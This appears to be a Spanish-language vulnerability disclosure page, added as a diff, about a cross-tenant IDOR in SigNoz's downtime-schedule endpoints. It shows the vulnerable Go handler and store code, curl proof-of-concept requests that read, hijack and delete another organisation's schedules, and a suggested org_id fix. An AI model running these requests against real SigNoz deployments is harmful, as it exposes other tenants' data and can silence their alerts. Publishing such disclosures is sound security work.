@@ -1,0 +1,248 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>SigNoz: IDOR cross-tenant en downtime schedules | ZsZsec</title>
+  <meta name="description" content="Investigación local sobre un IDOR cross-tenant en los endpoints de downtime schedules de SigNoz." />
+  <meta name="author" content="Santiago Bedoya (ZsZsec)" />
+  <link rel="canonical" href="https://zszsec.github.io/articulos/signoz-downtime-schedules-cross-tenant-idor.html" />
+  <meta property="og:title" content="SigNoz: IDOR cross-tenant en downtime schedules" />
+  <meta property="og:description" content="Investigación sobre un IDOR cross-tenant en los endpoints de downtime schedules de SigNoz." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://zszsec.github.io/articulos/signoz-downtime-schedules-cross-tenant-idor.html" />
+  <meta property="og:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta property="og:image:alt" content="ZsZsec | Security Researcher" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="SigNoz: IDOR cross-tenant en downtime schedules" />
+  <meta name="twitter:description" content="IDOR cross-tenant en los endpoints de downtime schedules de SigNoz." />
+  <meta name="twitter:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+  <div class="scanline"></div>
+  <header class="site-header">
+    <a class="brand" href="../index.html" aria-label="Inicio"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+    <nav class="nav" aria-label="Navegación principal"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link active" href="../articulos.html" aria-current="page">Artículos</a><a class="nav-link" href="../bug-bounty.html">Bug Bounty</a><a class="nav-link" href="../writeups.html">Writeups</a></nav>
+  </header>
+  <main>
+    <section class="page-hero compact">
+      <p class="eyebrow">security research / signoz</p>
+      <h1>Downtime schedules cross-tenant IDOR<span>_</span></h1>
+        <div class="writeup-meta"><span>Medium</span><span>Cross-tenant IDOR</span><span>No response</span></div>
+      <div class="tag-row"><span class="tag">SigNoz</span><span class="tag">IDOR</span><span class="tag">Broken Access Control</span><span class="tag">Multi-tenant</span></div>
+    </section>
+    <section class="content-shell">
+      <article class="markdown-body">
+        <blockquote><p><strong>Alcance:</strong> la validación se realizó dinámicamente en un laboratorio local de dos organizaciones construido desde la Community Edition de SigNoz. El hallazgo fue reportado al equipo de seguridad de SigNoz; no hubo respuesta ni se indicó una versión corregida.</p></blockquote>
+
+        <p>Durante la revisión de SigNoz encontré un fallo de control de acceso basado en objetos (IDOR/BOLA) en los endpoints de downtime schedules, también llamados ventanas de mantenimiento.</p>
+
+        <p>Los endpoints que reciben un UUID no verificaban que la organización del usuario fuera propietaria del recurso. Cualquier usuario autenticado que conociera o adivinara el UUID de otra organización podía leerlo, sobrescribirlo y reasignarlo a su propia organización, o eliminarlo directamente.</p>
+
+        <p>La validación confirmó el comportamiento entre dos organizaciones no relacionadas, sin usuarios, tokens ni proveedor de identidad compartidos. El problema pertenece a la Community Edition y no depende de una funcionalidad restringida a Enterprise Edition.</p>
+
+        <h2>Ficha técnica</h2>
+        <table>
+          <thead><tr><th>Campo</th><th>Detalle</th></tr></thead>
+          <tbody>
+            <tr><td>Producto</td><td>SigNoz Community Edition</td></tr>
+            <tr><td>Repositorio</td><td><a href="https://github.com/SigNoz/signoz" target="_blank" rel="noopener noreferrer">github.com/SigNoz/signoz</a></td></tr>
+            <tr><td>Reporte enviado</td><td>5 de agosto de 2026</td></tr>
+            <tr><td>Componente</td><td>Downtime schedules / planned maintenance</td></tr>
+            <tr><td>Endpoint de lectura</td><td><code>GET /api/v1/downtime_schedules/{id}</code></td></tr>
+            <tr><td>Endpoint de modificación</td><td><code>PUT /api/v1/downtime_schedules/{id}</code></td></tr>
+            <tr><td>Endpoint de borrado</td><td><code>DELETE /api/v1/downtime_schedules/{id}</code></td></tr>
+            <tr><td>Autenticación</td><td>Requerida</td></tr>
+            <tr><td>Roles confirmados</td><td>Viewer: lectura; Editor: modificación y borrado</td></tr>
+            <tr><td>Vulnerabilidad</td><td>CWE-639 / CWE-284</td></tr>
+            <tr><td>Severidad</td><td>Medium</td></tr>
+            <tr><td>Advisory</td><td>No indicado</td></tr>
+            <tr><td>Estado</td><td>No response / sin parche indicado</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Rutas afectadas</h2>
+        <p>Las rutas estaban registradas en <code>pkg/apiserver/signozapiserver/ruler.go</code>:</p>
+        <pre><code>GET    /api/v1/downtime_schedules/{id}  → ViewAccess
+PUT    /api/v1/downtime_schedules/{id}  → EditAccess
+DELETE /api/v1/downtime_schedules/{id}  → EditAccess</code></pre>
+
+        <p>Las operaciones de listado y creación sí aplicaban scope mediante <code>claims.OrgID</code>. El problema estaba en las tres rutas basadas en <code>{id}</code>, que no repetían esa comprobación de tenant.</p>
+
+        <h2>Handler sin aislamiento por organización</h2>
+        <p>En <code>pkg/ruler/signozruler/handler.go</code>, el UUID se validaba únicamente por formato y después se consultaba el recurso sin incluir la organización:</p>
+        <pre><code>id, err := valuer.NewUUID(mux.Vars(req)["id"])
+schedule, err := handler.ruler.MaintenanceStore().GetPlannedMaintenanceByID(ctx, id)</code></pre>
+
+        <p>La validación del formato del UUID no constituye una comprobación de autorización. El handler nunca comparaba la organización del recurso con <code>claims.OrgID</code> del usuario autenticado.</p>
+
+        <h2>Store sin filtro de org_id</h2>
+        <p>La capa SQL tampoco aplicaba aislamiento. En <code>pkg/alertmanager/alertmanagerstore/sqlalertmanagerstore/maintenance.go</code> la consulta utilizaba únicamente el ID:</p>
+        <pre><code>func (r *maintenance) GetPlannedMaintenanceByID(
+    ctx context.Context,
+    id valuer.UUID,
+) (*alertmanagertypes.PlannedMaintenance, error) {
+    ...Where("id = ?", id.StringValue())...
+}</code></pre>
+
+        <p>Esto permitía recuperar cualquier fila cuyo UUID fuera conocido, independientemente de la organización que la hubiera creado.</p>
+
+        <h2>El caso de actualización</h2>
+        <p>El impacto más significativo aparecía en <code>UpdatePlannedMaintenance</code>. La función obtenía una fila sin scope y posteriormente escribía la organización del atacante:</p>
+        <pre><code>existing, _ := r.GetPlannedMaintenanceByID(ctx, id)
+
+storablePlannedMaintenance := alertmanagertypes.StorablePlannedMaintenance{
+    ...
+    OrgID: claims.OrgID,
+    ...
+}</code></pre>
+
+        <p>La operación no solo sobrescribía nombre, descripción, horario y alertas vinculadas; también reasignaba <code>org_id</code> al tenant del editor que enviaba la petición.</p>
+
+        <h2>Prueba de concepto local</h2>
+        <p>El laboratorio contenía dos organizaciones independientes:</p>
+        <ul>
+          <li>Org A: organización propietaria de la ventana de mantenimiento.</li>
+          <li>Org B: organización del atacante, sin relación con Org A.</li>
+          <li>Token A: propietario o administrador de Org A.</li>
+          <li>Token B: usuario editor de Org B.</li>
+        </ul>
+
+        <h3>1. Crear una ventana en Org A</h3>
+        <pre><code>curl -sS -X POST "$BASE_URL/api/v1/downtime_schedules" \
+  -H "Authorization: Bearer $TOKEN_A" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "name":"OrgA Maintenance",
+    "description":"vdp-lab target",
+    "schedule": {
+      "timezone":"UTC",
+      "startTime":"2026-08-05T21:11:59Z",
+      "endTime":"2026-08-06T21:11:59Z"
+    },
+    "alertIds":["&lt;ALERT_A_ID&gt;"]
+  }'</code></pre>
+
+        <p>La API respondió <code>HTTP 201</code> y devolvió un UUID sintético para la ventana:</p>
+        <pre><code>{
+  "status": "success",
+  "data": {
+    "id": "&lt;ORG_A_SCHEDULE_ID&gt;",
+    "name": "OrgA Maintenance",
+    "createdBy": "admin@org-a.lab",
+    "updatedBy": "admin@org-a.lab",
+    "status": "active",
+    "kind": "fixed"
+  }
+}</code></pre>
+
+        <h3>2. Control: el listado de Org B no lo muestra</h3>
+        <pre><code>curl -sS "$BASE_URL/api/v1/downtime_schedules" \
+  -H "Authorization: Bearer $TOKEN_B"
+
+{"status":"success","data":[]}</code></pre>
+
+        <p>El listado estaba correctamente limitado a Org B. Esto demostraba que el recurso no pertenecía al tenant atacante y que el problema estaba específicamente en las rutas por ID.</p>
+
+        <h3>3. Lectura cross-tenant</h3>
+        <pre><code>curl -sS \
+  "$BASE_URL/api/v1/downtime_schedules/&lt;ORG_A_SCHEDULE_ID&gt;" \
+  -H "Authorization: Bearer $TOKEN_B"</code></pre>
+
+        <p>La respuesta fue <code>HTTP 200</code> y devolvió la ventana de Org A:</p>
+        <pre><code>{
+  "status": "success",
+  "data": {
+    "id": "&lt;ORG_A_SCHEDULE_ID&gt;",
+    "name": "OrgA Maintenance",
+    "description": "vdp-lab target",
+    "schedule": {
+      "timezone": "UTC",
+    },
+    "alertIds": ["&lt;ALERT_A_ID&gt;"],
+    "createdBy": "admin@org-a.lab",
+    "updatedBy": "admin@org-a.lab"
+  }
+}</code></pre>
+
+        <p>El token de Org B podía leer el nombre, descripción, horario, regla de alerta vinculada y correos de los usuarios de Org A.</p>
+
+        <h3>4. Hijack mediante PUT</h3>
+        <pre><code>curl -sS -X PUT \
+  "$BASE_URL/api/v1/downtime_schedules/&lt;ORG_A_SCHEDULE_ID&gt;" \
+  -H "Authorization: Bearer $TOKEN_B" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "name":"PWNED-BY-ORGB",
+    "description":"hijacked via IDOR",
+    "schedule": {
+      "timezone":"UTC",
+      "startTime":"2026-08-05T21:11:59Z",
+      "endTime":"2026-08-06T21:11:59Z"
+    },
+    "alertIds":[]
+  }'</code></pre>
+
+        <p>La API respondió <code>HTTP 204 No Content</code>. Al volver a consultar los listados:</p>
+        <pre><code>Org A → data: []
+Org B → data: [{
+  "id": "&lt;ORG_A_SCHEDULE_ID&gt;",
+  "name": "PWNED-BY-ORGB",
+  "alertIds": [],
+  "createdBy": "admin@org-a.lab",
+  "updatedBy": "admin@org-b.lab"
+}]</code></pre>
+
+        <p>La ventana desapareció del listado de Org A y apareció en Org B, con <code>org_id</code> reasignado y la alerta desvinculada.</p>
+
+        <h3>5. Borrado cross-tenant</h3>
+        <p>Creé una segunda ventana en Org A y la eliminé con el token editor de Org B:</p>
+        <pre><code>curl -sS -X DELETE \
+  "$BASE_URL/api/v1/downtime_schedules/&lt;SECOND_ORG_A_SCHEDULE_ID&gt;" \
+  -H "Authorization: Bearer $TOKEN_B"
+
+HTTP/1.1 204 No Content</code></pre>
+
+        <p>Después del borrado, Org A recibió <code>HTTP 404</code> al consultar un recurso que había creado originalmente:</p>
+        <pre><code>{
+  "status": "error",
+  "error": {
+    "type": "not-found",
+    "code": "not_found",
+    "message": "planned maintenance with ID does not exist"
+  }
+}</code></pre>
+
+        <h2>Impacto</h2>
+        <h3>Lectura</h3>
+        <p>Cualquier usuario autenticado con capacidad de obtener un UUID podía leer una ventana de mantenimiento de otra organización. Un rol Viewer podía acceder a nombre, descripción, recurrencia, zona horaria, IDs de alertas y los campos <code>createdBy</code>/<code>updatedBy</code>, incluyendo correos reales de usuarios del tenant víctima.</p>
+
+        <h3>Modificación y hijack</h3>
+        <p>Un usuario Editor podía sobrescribir la ventana, cambiar su horario, eliminar sus alertas vinculadas y reasignarla a su propia organización.</p>
+
+        <p>Esta operación podía convertirse en un vector de supresión de alertas: una ventana secuestrada podía apuntar a una regla de alerta de la víctima y silenciarla durante un intervalo elegido, ocultando potencialmente un incidente activo en el producto de monitorización.</p>
+
+        <h3>Borrado</h3>
+        <p>Un usuario Editor podía eliminar por completo una ventana de mantenimiento perteneciente a otra organización, afectando sus operaciones programadas y su configuración de alertas.</p>
+
+        <h2>Corrección sugerida</h2>
+        <p>El valor de <code>claims.OrgID</code> debe propagarse a <code>GetPlannedMaintenanceByID</code>, <code>UpdatePlannedMaintenance</code> y <code>DeletePlannedMaintenance</code>. Cada consulta debe incluir el filtro de tenant:</p>
+        <pre><code>Where("id = ?", id.StringValue()).
+Where("org_id = ?", orgID)</code></pre>
+
+        <p>La implementación debe seguir el patrón ya utilizado correctamente por <code>ListPlannedMaintenance</code> y <code>CreatePlannedMaintenance</code>. También conviene añadir pruebas de regresión con dos organizaciones, verificando lectura, modificación y borrado con UUIDs de un tenant distinto.</p>
+
+        <h2>Entorno</h2>
+        <p>La revisión se realizó contra el repositorio open source de SigNoz en la rama principal. La reproducción utilizó un build local con ClickHouse y Zookeeper mediante Docker Compose, dos organizaciones registradas de forma independiente y sin usuarios, tokens o proveedor de identidad compartidos.</p>
+
+        <h2>Estado</h2>
+        <p>El hallazgo fue reportado al equipo de seguridad de SigNoz. No hubo respuesta ni se indicó una versión corregida. Esta investigación queda publicada con ese estado.</p>
+      </article>
+    </section>
+  </main>
+  <footer class="site-footer"><span>ZsZsec</span></footer>
+</body>
+</html>
